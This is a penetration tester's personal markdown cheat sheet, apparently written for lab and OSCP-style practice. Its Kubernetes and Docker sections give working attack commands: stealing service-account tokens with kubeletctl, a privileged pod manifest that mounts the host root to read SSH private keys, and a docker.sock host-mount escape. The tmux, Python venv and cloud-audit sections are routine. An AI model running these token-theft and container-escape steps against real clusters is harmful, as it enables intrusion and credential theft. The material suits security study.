- [Kubernetes](#kubernetes)
- [Docker](#docker)
- [TMUX cheat sheet](#tmux-cheat-sheet)
- [Python venv](#python-venv)
- [Cloud](#cloud)
  - [ScoutScuit](#scoutscuit)
  - [CloudFox](#cloudfox)
  - [AWS](#aws)

## Kubernetes
[Kube Pentest](https://blog.appsecco.com/a-pentesters-approach-to-kubernetes-security-part-1-2b328252954a)
- binary:
  - https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux

- steps
  - check permisions: kubectl auth can-i --list
  - check configuration: kubectl get node/pods -o yaml
  - Check secrets
  - check folders
  - check git
  - create all allowed pod: https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed
  - go to host folderLand
  - proc/self/cgroup

- Commands:
  - /var/run/secrets/kubernetes.io/serviceaccount/token
  - kubectl get 
    - pods -A (All namespace)
    - secrets
      - kubectl get secret [name] -o (output 'json')
      - kubectl edit secret NAME
    - auth can-i --list = permissions
    - exec -it grafana-57454c95cb-v4nrk
      - exec -it NAME --namespace=name_space
    - node -o yaml = internal information
  - Using Token
    - kubeletctl -i --server IP exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p CONTAINER -c CONTAINER | tee -a k8.token = extract token
    - kubeletctl --server IP exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p CONTAINER -c CONTAINER | tee -a ca.crt  = extract cert
      - export token=`cat k8.token`
      - kubectl --token=$token --certificate-authority=ca.crt --server=https://IP:PORT auth can-i --list
    - kubectl auth can-i --list --token=${TOKEN}
    - --token=${TOKEN}
    - kubectl exec -it {NAME_POD} --token=${TOKEN} -- /bin/bash => get session
  - kubeletctl -i --server IP pods
  - kubeletctl -i --server IP scan rce
  - curl https://IP:PORT/pods -k | jq .
  - Execut commands:
    - kubeletctl -i --server IP exec "id" -p nginx -c nginx

- Exploiting
  - pod.yaml
```
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
  - Create POD
    - kubectl --token=$token --certificate-authority=ca.crt --server=https://IP:PORT apply -f privesc.yaml
    - kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
  - Extract info
    - kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

- Nodes
  - https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
  - bad POD:
    - https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
    - kubectl apply -f file.yml --token=
    - kubectl exec -it POD_NAME --token=  -- /bin/bash
- Deployments
- Services
- Ingress
- Jobs
- Enviroment variables:
  - env: search for tcp

## Docker
- Group, SUID, as root (sudoers)
- Socket: /var/run/docker.sock.
  - Existing image
    - docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

- Create and run
  - docker compose build
  - docker compose up -d
  - docker exec -it PythonLearn bash

- docker pandoc:
```
docker exec 7b4294cce723 pandoc FOLDER/OSCP_Report_REPORT_THM.md \
-o OSCP_Report_REPORT_THM.pdf \
--from markdown+yaml_metadata_block+raw_html \
--template eisvogel \
--table-of-contents \
--toc-depth 6 \
--number-sections \
--top-level-division=chapter \
--highlight-style pygments \
--resource-path=.:src

docker exec 7b4294cce723 pandoc OSCP_Report_Steel_Mountail_THM.md \
-o OSCP_Report_REPORT_THM.pdf \
--from markdown+yaml_metadata_block+raw_html \
--template eisvogel \
--table-of-contents \
--toc-depth 6 \
--number-sections \
--top-level-division=chapter \
--highlight-style pygments \
--resource-path=.:src
```
- List all containers
  - docker ps --all --format '{{.ID}}'
    - '{{.Names}}'
    - '{{.Images}}'
    - '{{.Command}}'
    - '{{.Status}}'

- docker remove
- Docker remove all images
  - docker rmi $(docker images --filter "dangling=true" -q --no-trunc)
  - docker rmi $(docker images -q) -f
  - docker rm $(docker ps -a -q)
  - docker system prune
    - docker system prune --all --force --volumes


## TMUX cheat sheet
- tmux
- tmux new
  
- tmux new
  - -s SESSIONNAME
  - ctrl + b $ = rename

- Detach | reattach
  - -d
  - tmux attach 
  - tmux attach -d -t name

- tmux kill-ses -t session
- tmux kill-session -a = kil all

- ctrb +b $: new window

- Variables
	- tmux setenv VARIABLE value
	- export Variable=value
	- tmux showenv = display variables
	-  tmux show-environment VARIABLE
- show all
  - tmux a

- Split ctr+b
  - %: vertical
  - ": horizontal
  - x: kill pane

- set Mouse
  - ctr + b + :
    - setw -g mouse on

- New window
  - ctr+b +c
  - ctr+b +n = move to window
  - ctr*b 1,n = to window number
  - ctr+b +w = list windows
  

## Python venv
- python -m venv /path
- source bin/activate
- deactivate
  
## Cloud
### ScoutScuit
- [Scoutsout](https://github.com/nccgroup/ScoutSuite)
- 
```
virtualenv -p python3 venv
source venv/bin/activate
pip install scoutsuite
scout --help

#GCP
gcloud auth login
gcloud auth application-default login
scout.py gcp --user-account
scout.py gcp --service-account </PATH/TO/KEY_FILE.JSON>
scout.py gcp --user-account --all-subscription
```

### CloudFox
- [CloudFox](https://github.com/BishopFox/cloudfox)
  - Limited to AWS and Azure
  
### AWS
**awscli**
- aws configure
- aws s3 ls s3://path/to/container
  - --endpoint-url=http://path/to/container s3://path/to/container
- Copy
  - aws s3 cp/mv file s3://path/to/container
  - aws s3 cp FILE_TO_COPY  --endpoint-url=http://path/to/container s3://path/to/container
- owner
  - aws s3api get-bucket-acl --bucket bucket-name
  - 